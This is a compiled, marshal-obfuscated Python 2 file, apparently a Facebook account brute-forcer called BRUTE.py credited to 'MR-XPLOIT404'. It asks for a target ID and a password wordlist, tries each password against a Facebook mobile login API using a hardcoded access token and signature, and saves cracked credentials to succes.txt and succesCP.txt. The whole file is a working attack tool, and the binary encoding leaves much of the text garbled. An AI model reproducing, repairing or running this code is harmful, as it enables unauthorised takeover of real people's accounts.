�
��_c           @   s!   d  d l  Z  e  j d � d Ud S(   i����Ns�  c           @   s!   d  d l  Z  e  j d � d Ud S(   i����Ns  c           @   sL  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z y d  d l Z Wn e	 k
 r� e  j
 d � n2 Xy d  d l Z Wn e	 k
 r� e  j
 d � n Xd  d l m
 Z
 d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d d	 �d g e _ d Z d
 �  Z e �  d S(   i����N(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s�  [1;96m      █████████ [1;93m* [1;92mAuthor [1;93m: [1;92mMR-XPLOIT404[1;96m
      █▄█████▄█ [1;93m* [1;93mVersi [1;93m: [1;93mGOLD[1;96m
      █ [1;91m▼▼▼▼▼[1;96m █ [1;93m* [1;92mWhatsApp [1;93m: [1;97m6287819450610[1;96m
     ██▌     ██▌ 
      [1;96m█ [1;91m▲▲▲▲▲[1;96m █ [1;93m* [1;91mYOUTUBE [1;93m: [1;97mBLACK HAT[1;96m
      █████████ 
       ██   ██c    	      C   sb  y6t  j d � t GHt d � }  t d � } t | d � } | j �  } d |  GHt j d � d t t	 | � � GHHt | d � } x�| D]�} yx| j
 d d	 � } t j j
 d
 |  d | � t j j �  t j d |  d
 | d � } t j | j � } d | k r�t d d � } | j
 d |  d � | j
 d | � | j �  Hd d GHd |  GHd | GHd GHd d GHt j �  n� d | d k rt d d � } | j
 d |  d � | j
 d | � | j �  Hd d GHd |  GHd | GHd GHd d GHt j �  n  Wq� t j j k
 r0d GHt j �  q� Xq� WWn% t k
 r]d GHd  GHt j �  n Xd  S(!   Nt   clears   [1;96mID/Email : [1;93ms   [1;96mFile Wordlist : [1;93mt   rs   [1;96mTarget :[1;93m g      @s   [1;96mTotal List :[;93m s   
t    s   
[1;96ms
   [1;93m : s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens
   succes.txtt   ws   [ID]=> s
   [password]=> i*   s   [1;93m=s   [1;96mID : [1;93ms   [1;96mpassword : [1;93ms   [1;96mStatus : [1;93mOKs   www.facebook.comt	   error_msgs   succesCP.txts   [PW]=> s   [1;96mStatus : [1;93mCPs-   [37;1m[[32;1mx[37;1m] [31;1mkoneksi errors9   [37;1m[[32;1mx[37;1m] [37;1mAlamat wordlist tidak adasF   [37;1m[[32;1mx[37;1m] [37;1mSaya sarankan Untuk Membuatnya sendiri(   t   ost   systemt   logot	   raw_inputt   opent	   readlinest   timet   sleept   strt   lent   replacet   syst   stdoutt   writet   flusht   requestst   gett   jsont   loadst   textt   closet   exitt
   exceptionsR   t   IOError(	   t   emailt   pwdt   totalt   sandit   pwt   datat   mpsht   dapatt   ceks(    (    R   t   start   sd    
	



				

				
(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   R   R   R   t   datetimet   randomR   t   multiprocessing.poolR    t	   mechanizet   ImportErrorR   R   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR
   R,   (    (    (    R   t   <module>   s(   H




	6(   t   marshalt   loads(    (    (    t    t   <module>   s   (   t   marshalt   loads(    (    (    s   /sdcard/BRUTE.pyt   <module>   s   
